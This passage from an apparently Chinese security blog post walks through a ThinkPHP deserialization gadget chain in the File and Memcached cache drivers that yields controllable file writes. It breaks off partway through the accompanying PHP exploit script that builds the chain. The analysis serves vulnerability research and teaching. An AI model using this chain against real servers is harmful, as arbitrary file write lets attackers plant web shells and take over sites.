&#x27;.php&#x27;</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$dir</span>      = <span class="title function_ invoke__">dirname</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 $auto = true 会创建文件夹</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$filename</span>; <span class="comment">// 返回转换后的文件路径</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后如果 <code>$this-&gt;tag</code> 为 <code>true</code> 且文件不存在说明是第一次写入。如果是第一次写入，则在完成文件写入之后还会调用 <code>think\cache\Driver-&gt;setTagItem</code> 函数再次写入文件。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $this-&gt;tag = true 且文件不存在则表示第一次创建，$first = true</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中间对写入的数据 $data 做一些转换</span></span><br><span class="line"><span class="comment">// [....]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 向 $filename 文件写入数据 $data</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果成功写入数据</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果是第一次写入则会调用 think\cache\Driver 的 setTagItem 方法更新标签</span></span><br><span class="line">    <span class="comment">// 这个方法会调用 $this-&gt;set 函数再次进行文件写入</span></span><br><span class="line">    <span class="comment">// 且此时第二个参数可以设置为这里传入的 $filename</span></span><br><span class="line">    <span class="comment">// 言外之意就是我们可以通过这里的 $filename 控制写入内容</span></span><br><span class="line">    <span class="comment">// 然而这里的 $filename 是要写入内容的 md5 拼接出来的，不可控</span></span><br><span class="line">    <span class="comment">// 因此不会使用这里的调用点构造反序列化链，也就是 $this-&gt;tag = false</span></span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="title function_ invoke__">clearstatcache</span>(); <span class="comment">// 更新文件缓存</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果我们设置 <code>$this-&gt;tag = true</code> 则 <code>setTagItem</code> 会调用 <code>$this-&gt;set</code> 将 <code>$name</code> 写入文件。然而这里传入的 <code>$name</code> 是经过 <code>getCacheKey</code> 函数做过哈希运算的内容，实际上是不可控的。因此我们不能通过这条链完成文件写入。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 更新标签</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name 缓存标识</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setTagItem</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag) &#123;</span><br><span class="line">        <span class="variable">$key</span>       = <span class="string">&#x27;tag_&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;tag);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tag = <span class="literal">null</span>; <span class="comment">// 为了防止无限递归，这里会将 $this-&gt;tag 设置为 null</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="comment">// 如果存在 $key 对应的文件</span></span><br><span class="line">            <span class="comment">// 那么先将文件中的内容读出，并以 &#x27;,&#x27; 为分隔转换为数组</span></span><br><span class="line">            <span class="variable">$value</span>   = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>));</span><br><span class="line">            <span class="comment">// 在数组末尾插入 $name</span></span><br><span class="line">            <span class="variable">$value</span>[] = <span class="variable">$name</span>;</span><br><span class="line">            <span class="comment">// 数组去重后以 &#x27;,&#x27; 为分隔转换成字符串作为要写入文件的内容</span></span><br><span class="line">            <span class="variable">$value</span>   = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="title function_ invoke__">array_unique</span>(<span class="variable">$value</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果不存在 $key 对应的文件</span></span><br><span class="line">            <span class="comment">// 则直接设置 $name 为要写入文件的内容</span></span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 调用 $this-&gt;set 将 $value 写入文件</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后 <code>File-&gt;set</code> 在文件写入这块主要是将写入内容 <code>$value</code> 做了如下转换：</p>
<ol>
<li>将写入数据进行序列化。</li>
<li>如果 <code>$this-&gt;options[&#39;data_compress&#39;] = true</code> 还会将写入数据进行 gzip 压缩，不过这里我们为了控制文件内容通常设置 <code>$this-&gt;options[&#39;data_compress&#39;] = false</code>。</li>
<li>在写入数据前拼接一段 PHP 代码：<code>&quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot;</code>。</li>
</ol>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将要写入的值 $value 序列化一下</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果 $this-&gt;options[&#x27;data_compress&#x27;] = true 则会将数据压缩</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">//数据压缩</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将要写入的数据和一段 PHP 代码拼接</span></span><br><span class="line"><span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向 $filename 文件写入数据 $data</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure></div>

<p>然而前面分析过，<code>$data</code> 传入的是值是 <code>true</code>，然后 <code>$expire</code> 传入的值是 <code>0</code>，因此写入文件的内容如下：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//000000000000</span></span><br><span class="line"> <span class="keyword">exit</span>();<span class="meta">?&gt;</span></span><br><span class="line">b:<span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<p>显然这里文件写入的内容也是不可控的。</p>
<p>不过观察发现，<code>think\cache\driver\File-&gt;set</code> 的上一层 <code>think\cache\driver\Memcached-&gt;set</code> 在逻辑上和它很像。都有一个第一次写入的 <code>$first</code> 判断。不过这里判断文件是否存在用的不是 <code>is_file</code> 函数，而是 <code>$this-&gt;has</code>，这是因为这里参数 <code>$name</code> 还没有通过 <code>$this-&gt;handler-&gt;getCacheKey</code> 转换为写入文件的名称。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果没有 $name 对应的缓存文件则 $this-&gt;has($name) 返回 false</span></span><br><span class="line"><span class="comment">// ✅ 因此进入判断设置 $first = true</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 因为 $this-&gt;options[&#x27;prefix&#x27;] = &#x27;&#x27; 所以 getCacheKey 直接返回 $name</span></span><br><span class="line"><span class="comment">// 因此这里等价于 $key = $name</span></span><br><span class="line"><span class="variable">$key</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0 == $expire 满足条件因此 $expire = 0</span></span><br><span class="line"><span class="variable">$expire</span> = <span class="number">0</span> == <span class="variable">$expire</span> ? <span class="number">0</span> : <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_TIME&#x27;</span>] + <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 📌 首先调用 $this-&gt;handler-&gt;set 第一次写入文件，此处文件内容不可控。</span></span><br><span class="line"><span class="comment">// $key = &#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27; 经过转换变为文件名</span></span><br><span class="line"><span class="comment">// $value = true 经过序列化和拼接等操作变成文件内容</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$expire</span>)) &#123;</span><br><span class="line">    <span class="comment">// 由于前面设置 $first = true</span></span><br><span class="line">    <span class="comment">// 因此调用 $this-&gt;setTagItem → $this-&gt;set 再次调用到这个函数</span></span><br><span class="line">    <span class="comment">// 由于此时经过参数转换后文件内容作为第二个参数传入</span></span><br><span class="line">    <span class="comment">// 📌 因此 $this-&gt;handler-&gt;set 完成第二次写入时文件内容可控</span></span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>$this-&gt;has</code> 主要通过 <code>$this-&gt;handler-&gt;get</code> 判断文件是否存在。前面会先调用 <code>$this-&gt;getCacheKey</code> 作一下转换，不过只是在名称前面拼接一段 <code>$this-&gt;options[&#39;prefix&#39;]</code>，没什么影响。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断缓存</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name 缓存变量名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">has</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>File-&gt;get</code> 函数则会读取 <code>$name</code> 经过 <code>File-&gt;getCacheKey</code> 转换后得到的文件名对应文件的内容。如果文件还没有创建的话返回空导致 <code>Memcached-&gt;has</code> 返回 <code>false</code>。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取缓存</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name 缓存变量名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed  $default 默认值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$default</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span>      = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;expire = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="variable">$content</span>) &#123;</span><br><span class="line">        <span class="variable">$expire</span> = (<span class="keyword">int</span>) <span class="title function_ invoke__">substr</span>(<span class="variable">$content</span>, <span class="number">8</span>, <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != <span class="variable">$expire</span> &amp;&amp; <span class="title function_ invoke__">time</span>() &gt; <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>) + <span class="variable">$expire</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;expire = <span class="variable">$expire</span>;</span><br><span class="line">        <span class="variable">$content</span>      = <span class="title function_ invoke__">substr</span>(<span class="variable">$content</span>, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//启用数据压缩</span></span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">gzuncompress</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外前面分析过，<code>$this-&gt;handler-&gt;set</code> 会返回 <code>true</code>，因此可以走到 <code>$this-&gt;setTagItem</code> 逻辑。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$expire</span>)) &#123;</span><br><span class="line">    <span class="comment">// 由于前面设置 $first = true</span></span><br><span class="line">    <span class="comment">// 因此调用 $this-&gt;setTagItem → $this-&gt;set 再次调用到这个函数</span></span><br><span class="line">    <span class="comment">// 由于此时经过参数转换后文件内容作为第二个参数传入</span></span><br><span class="line">    <span class="comment">// 📌 因此 $this-&gt;handler-&gt;set 完成第二次写入时文件内容可控</span></span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>think\cache\driver\Memcached</code> 和 <code>think\cache\driver\File</code> 都继承于 <code>think\cache\Driver</code>，因此调用的都是 <code>Driver</code> 类的 <code>setTagItem</code> 函数。前面分析过，<code>setTagItem</code> 函数会将传入的参数写入文件，而这里传入的参数 <code>$key</code> 就是前面可控的 <code>$name</code>。因此我们可以通过这条链实现文件写入。</p>
<p>注意这里写入的文件的文件名中拼接的 MD5 是 <code>&#39;md5(tag_&#39;.md5(File-&gt;tag))</code>，因此多次写入如果路径相同则都是写在同一个文件里面。</p>
<h3 id="利用脚本-4"><a href="#利用脚本-4" class="headerlink" title="利用脚本"></a>利用脚本</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>\<span class="title class_">HasMany</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Process</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processPipes</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processInformation</span> = [<span class="string">&#x27;running&#x27;</span> =&gt; <span class="literal">true</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;processPipes = <span class="keyword">new</span> <span class="title class_">HasMany</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Relation</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">query</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">stdClass</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">HasMany</span> <span class="keyword">extends</span> <span class="title">Relation</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$localKey</span> = <span class="string">&#x27;k&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$foreignKey</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;foreignKey = <span class="variable">$data</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Output</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;localKey&#125; = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Query</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Output</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">styles</span> = [</span><br><span class="line">            &#x27;<span class="title class_">where</span>&#x27;</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        